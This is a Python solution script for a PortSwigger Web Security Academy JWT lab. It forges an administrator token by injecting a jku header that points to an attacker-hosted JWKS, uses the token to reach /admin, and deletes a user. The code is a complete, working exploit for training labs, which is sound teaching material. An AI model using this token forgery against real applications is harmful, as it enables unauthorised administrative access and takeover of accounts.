#!/usr/bin/env python3
"""
JWT authentication bypass via jku header injection
PortSwigger Web Security Academy -- JWT

Companion script for the writeup: 05-jku-header-injection.md

What this does:
    Logs in to get a genuine RS256 session JWT, generates a fresh RSA key
    pair, and builds a forged token whose "jku" header points at a JWKS
    document we host on the lab's own per-lab exploit server. It auto-
    detects that exploit server's URL from a link on the lab's home page,
    then POSTs the exploit server's response-configuration form to store
    our JWKS JSON at /exploit. With the forged, sub=administrator token's
    jku pointing at that hosted JWKS and signed with the matching private
    key, requesting /admin and then deleting carlos solves the lab.

Usage:
    python 05-jku-header-injection.py <lab-url> [exploit-server-url]
    e.g. python 05-jku-header-injection.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

    The exploit server URL is auto-detected from the lab home page if not
    given explicitly.

Requirements:
    pip install httpx cryptography
"""

import base64
import json
import re
import sys
import httpx

from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def exploit_forge_jku_injection(jwt_token: str, new_claims: dict, jku_url: str) -> tuple[str, dict]:
    """Generate an RSA key pair, point jku at jku_url, sign with the private key.

    Returns (forged_jwt, jwks_json_to_host) -- the caller must host jwks_json_to_host at jku_url.
    """
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    public_key = private_key.public_key()
    pub_numbers = public_key.public_numbers()

    def _int_to_b64url(n: int) -> str:
        byte_len = (n.bit_length() + 7) // 8
        return _b64url_encode(n.to_bytes(byte_len, "big"))

    jwk = {
        "kty": "RSA",
        "e": _b64url_encode(pub_numbers.e.to_bytes((pub_numbers.e.bit_length() + 7) // 8, "big")),
        "n": _int_to_b64url(pub_numbers.n),
        "kid": "exploit-key",
    }
    jwks = {"keys": [jwk]}

    header, payload, _ = decode_jwt(jwt_token)
    payload.update(new_claims)
    header["alg"] = "RS256"
    header["jku"] = jku_url
    header["kid"] = "exploit-key"

    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    sig = private_key.sign(signing_input, asym_padding.PKCS1v15(), hashes.SHA256())
    return f"{h}.{p}.{_b64url_encode(sig)}", jwks


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> str:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""

    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": username, "password": password
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return client.cookies.get("session", "")


def solve(lab_url: str, exploit_server: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url)
    if not session:
        print("[-] Login failed")
        return
    print(f"[+] Got session JWT: {session[:50]}...")

    if not exploit_server:
        r = client.get(lab_url)
        m = re.search(r"href=['\"]?(https://exploit-[^'\">\s]+)", r.text)
        if not m:
            print("[-] Could not auto-detect the exploit server -- pass its URL explicitly")
            return
        exploit_server = m.group(1).rstrip("/")
        print(f"[+] Exploit server: {exploit_server}")

    jku_url = f"{exploit_server}/exploit"
    forged, jwks = exploit_forge_jku_injection(session, {"sub": "administrator"}, jku_url)
    print(f"[+] Forged token with jku -> {jku_url}")

    jwks_body = json.dumps(jwks)
    r = client.post(exploit_server, data={
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "statusCode": "200",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/json",
        "responseBody": jwks_body,
        "formAction": "STORE",
    })
    print(f"[+] JWKS hosted on exploit server -> {r.status_code}")

    client.cookies.clear()
    client.cookies.set("session", forged)
    r = client.get(f"{lab_url}/admin")
    print(f"[*] /admin -> {r.status_code}")

    if "/admin/delete" in r.text:
        r = client.get(f"{lab_url}/admin/delete?username=carlos")
        print(f"[*] Delete carlos -> {r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) not in (2, 3):
        print(f"Usage: python {sys.argv[0]} <lab-url> [exploit-server-url]")
        sys.exit(1)
    server = sys.argv[2].rstrip("/") if len(sys.argv) == 3 else ""
    solve(sys.argv[1].rstrip("/"), server)
